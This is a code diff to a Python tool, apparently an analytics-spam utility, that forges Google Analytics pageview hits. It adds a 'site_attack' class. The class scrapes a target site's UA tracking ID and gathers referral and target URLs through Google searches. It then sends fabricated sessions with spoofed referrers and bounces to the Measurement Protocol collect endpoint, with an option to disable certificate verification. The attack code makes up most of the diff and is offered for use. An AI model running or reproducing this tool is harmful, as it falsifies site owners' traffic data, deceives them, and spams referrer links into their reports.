@@ -13,13 +13,19 @@ from threading import Thread
 
 def main():
     global proxies
+    global verify_certs
+    verify_certs = True
     proxies = {
         #'http': 'socks5://192.168.0.103:9100',
         #'https': 'socks5://192.168.0.103:9100'
+        #'http': 'http://192.168.0.107:8080',
+        #'https': 'https://192.168.0.107:8080'
     }
     logging.basicConfig(level=logging.INFO)
-    session = single_page_attack_session(target_url='http://zonksec.com', referral_url='https://gethackedhere.com/', bounces=2, session_jitter=.50,session_delay=5, end_with=True)
-    single_page_attack(session=session, number_of_sessions=5, threads=2)
+    #session = referer_page_attack_session(target_url='http://zonksec.com', referral_url='https://hackerman.com/', bounces=2, session_jitter=.50,session_delay=5, end_with=True)
+    #single_page_attack(session=session, number_of_sessions=5, threads=2)
+    session = site_attack(target_site='http://zonksec.com',referral_keyword='hacker blog',target_site_url_pool=5,referral_pool=10, bounces=2,session_delay=0,session_jitter=0)
+    session.run(client_id=402)
 
 
 
@@ -51,7 +57,7 @@ def thread_session(i,q,session,delay=5,jitter=.50):
         time.sleep(time_delay)
         q.task_done()
 
-class single_page_attack_session:
+class referer_page_attack_session:
     def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, loop=1, end_with=True, tracking_id=None, geo_id=''):
         self.target_url = target_url
         self.referral_url = referral_url
@@ -73,7 +79,7 @@ class single_page_attack_session:
 
         #grabs tracking ID from target site.
         if self.tracking_id is None:
-            page = requests.get(target_url,proxies=proxies)
+            page = requests.get(target_url,proxies=proxies,verify=verify_certs)
             m = re.search("'(UA-(.*))',", page.text)
             self.tracking_id = str(m.group(1))
 
@@ -116,7 +122,7 @@ class single_page_attack_session:
                 delay = self.page_delay - random.randint(0,int(self.page_delay * self.page_delay_jitter))
                 logging.debug('[*] Session sleep for %i seconds.', delay)
                 time.sleep(delay)
-                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,9)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=self.geo_id)
+                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls))],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=self.geo_id)
                 bounce_request.send()
                 pages.append(bounce_request.document_location)
                 last_page = bounce_request.document_location
@@ -136,6 +142,93 @@ class single_page_attack_session:
 
         return behavior[:-4]
 
+class site_attack:
+    def __init__(self,target_site,target_site_urls=None,target_site_keyword=None,tracking_id=None,target_site_url_pool=10,referral_urls=None, referral_keyword=None,referral_pool=20,bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20):
+        self.referral_urls = referral_urls
+        self.referral_keyword = referral_keyword
+        self.referral_pool = referral_pool
+        self.target_site_urls = target_site_urls
+        self.target_site_url_pool = target_site_url_pool
+        self.target_site_keyword = target_site_keyword
+        self.target_site = target_site
+        self.bounce_urls = bounce_urls
+        self.session_delay = session_delay
+        self.session_jitter = session_jitter
+        self.bounces = bounces
+        self.bounce_pool = bounce_pool
+        self.tracking_id = tracking_id
+
+        if not self.referral_urls and not self.referral_keyword:
+            logging.error('[-] Needs either a referral_url or keyword.')
+            sys.exit(1)
+        if self.referral_urls and self.referral_keyword:
+            logging.error('[-] Needs either a referral_url or keyword. Not both.')
+            sys.exit(1)
+        if self.referral_keyword and not self.referral_pool:
+            logging.error('[-] Needs referral pool.')
+            sys.exit(1)
+
+        if self.tracking_id is None:
+            page = requests.get(self.target_site,proxies=proxies,verify=verify_certs)
+            m = re.search("'(UA-(.*))',", page.text)
+            self.tracking_id = str(m.group(1))
+
+        if self.referral_keyword:
+            logging.info('[*] Referral URLs are needed.')
+            self.referral_urls = []
+            search_results = list(google.search(query=self.referral_keyword, num=self.referral_pool, stop=1))
+            logging.info('[+] Grabbed %s referral URLs using Google', str(sum(1 for i in search_results)))
+            for result in search_results:
+                self.referral_urls.append(str(result))
+
+        if not self.target_site_urls:
+            logging.info('[*] Target URLs are needed.')
+            self.target_site_urls = []
+            if not self.target_site_keyword:
+                search_results = list(google.search(query="site:"+self.target_site, num=self.target_site_url_pool,stop=1))
+            else:
+                search_results = list(google.search(query="site:" + self.target_site + ' '+self.target_site_keyword, num=self.target_site_url_pool, stop=1))
+            logging.info('[+] Grabbed %s target URLs using Google', str(sum(1 for i in search_results)))
+            for result in search_results:
+                self.target_site_urls.append(str(result))
+
+        if self.bounces != 0 and self.bounce_urls is None:
+            logging.info('[*] Bounce URLs are needed.')
+            self.bounce_urls = []
+            search_results = list(google.search(query="site:"+self.target_site, num=self.bounce_pool,stop=1))
+            logging.info('[+] Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
+            for result in search_results:
+                self.bounce_urls.append(str(result))
+
+    def run(self,client_id=None):
+        count =0
+        while count < len(self.target_site_urls):
+            pages = []
+            request = analytics_request(document_location=self.target_site_urls[count], document_referrer=self.referral_urls[random.randint(0,(len(self.referral_urls)-1))], client_id=client_id,tracking_id=self.tracking_id, geo_id='')
+            pages.append(request.document_referrer)
+            last_page = self.target_site_urls[count]
+            request.send()
+            count = count + 1
+            bounce_count = 0
+
+            while (bounce_count < self.bounces):
+                delay = self.session_delay - random.randint(0,int(self.session_delay * self.session_jitter))
+                logging.debug('[*] Session sleep for %i seconds.', delay)
+                time.sleep(delay)
+                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls)-1)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id='')
+                bounce_request.send()
+                pages.append(bounce_request.document_location)
+                last_page = bounce_request.document_location
+                bounce_count += 1
+            behavior = ''
+            for page in pages:
+                behavior = behavior + page + ' => '
+            print(behavior)
+
+
+
+
+
 
 
 class analytics_request:
@@ -151,7 +244,7 @@ class analytics_request:
         self.anon_ip = anon_ip
 
         if self.tracking_id is None:
-            page = requests.get(document_location,proxies=proxies)
+            page = requests.get(document_location,proxies=proxies,verify=verify_certs)
             m = re.search("'(UA-(.*))',", page.text)
             self.tracking_id = str(m.group(1))
 
@@ -167,7 +260,7 @@ class analytics_request:
         params['geoid'] = self.geo_id
         params['ua'] = self.user_agent
 
-        r = requests.post('https://www.google-analytics.com/collect', data=params,proxies=proxies)
+        r = requests.post('https://www.google-analytics.com/collect', data=params,proxies=proxies,verify=verify_certs)
         logging.debug('[*] Request Sent. ' + str(params))
 
 
